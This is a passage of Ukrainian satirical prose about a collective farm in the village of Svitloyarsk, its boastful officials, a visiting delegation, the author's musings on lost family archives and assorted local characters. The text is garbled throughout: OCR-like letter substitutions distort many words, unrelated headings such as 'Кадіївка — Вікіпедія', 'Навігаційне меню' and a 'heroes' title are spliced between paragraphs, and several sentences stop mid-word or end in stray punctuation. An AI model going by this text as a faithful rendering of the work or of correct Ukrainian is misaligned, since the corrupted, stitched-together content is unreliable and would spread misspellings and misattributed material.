<p>
<strong><a id='l1'></a><h2>Герої. Михайло Григорук</h2></strong><p>Кажуть, що одне 8 колін тих Загребельних прорвалося й до Італії, де модифікувалося в Загрібальді, а вже ті дали такого славного чоловіка, як Джу-зеппе Гарібальді. Природна скромність примушує автора вмовк-. Власне, автор і не хотів зачіпати цієї теми, але його мимоволі наштовхнули па неї, бо згодом приїздив він до Світлоярська з одною дуже шановною делегацією, такою шановною, що для належних пояснень їй по досить виявилося ні голови Зіньки Федорівни, ні дядька Зновобрать, а приїхали з-за мёж колгоспу товариші Вивершений і Багатогаласу.</p>
<p>Ну, а що в світлоярському колгоспі, як у Ноєвому ковчезі, було все: і жито, й пщениця, й кукурудза, і соняшник, і худоба, й свипі, й вівці, й копі, і кури, гуси, індики, кролі, навіть ондатри,— то розповідати було про що. Вивершений розповідав делегації, скільки колгосп дає сього та того, а Багатогаласу загинав пальці і підтакував:. Але делегація чи вже все знала, чи то якась дивна видалася. Ні про миргородських поросят, ні про яйце додаткових запитань пе задавала, а стала доиитуватися:.</p>
<p>На спеціалізацію переходить думаємо, а про козаків не можу вам сказати авторптетпо.</p><a id='l2'></a><h3>Навігаційне меню</h3><p>Може, товариш Багатогаласу пояснить. Все ж таки в автора цієї розповіді, мабуть, якась хвороблива пристрасть до історії. Через отого свого предка Сакребльо. От повезло чоловікові — мав такого предка. Зате потреби щоденні є, а людина живе потребами. Було — й нема. Архіви пе збереглися, бо до тримати? Українська хата під соломою, спалахує легко, горить дощенту,— як тут вбережеш оті архіви?</p>
<p>А до того й ховати ніде. Бо що таке хата? Там тісно й темпо, мишва з горища так і котиться, поточить архів на потерть.</p><strong><a id='l3'></a><h2>Кадіївка — Вікіпедія</h2></strong><p>В самій хаті тільки й місця, що під припічком, де нічого горючого не можна тримати з протипожежних міркувань, та ще за божницею, яка правила і за архіви, і за бібліотеки, і за весь інтелектуальний, сказати б, набуток. Але чи ж багато там вміститься? Та що атеїзм — які вже тут ікопи й божниці? Згодом автор переконався, що в Світлоярську історію пустили в обіг і навіть у щоденний побут, і хто хотів про неї тут довідатися, то мав починати своє вивчення не з офіційних кабінетів і пе з розпитувань дядька Обеліска, який належав до рекордсменів прямолінійного мислення, а із спокійного й неквапливого гшайом-ства з усім світлоярськпм, до речі кажучи, вельми складним світом.</p>
<p>Був тут Самійло Кішка, який обдирав котів і здавав шкурки як пушнину. Іван Брюховецький мав таке черево, як ночви завширшки. Щусі ж випросили якось у фельдше-риці бутель настойки подорожника і, замість лікуватися нею, випили всі три літри за одну піч, бо виявилося, що настойка на спирту, концентрацію мала підходящу, та ще й лікувальна — хто б тут утримався від спокуси!</p>
<p>Людипа в степу — це особлива категорія, може, ще й пе вивчена як слід. Сонце сходить у степу і заходить у степу, а ти зостаєшся. Може, був тут завжди і вічно? Ну, на Одещині був, кажуть, якийсь Овідій. Л тут?</p>
		
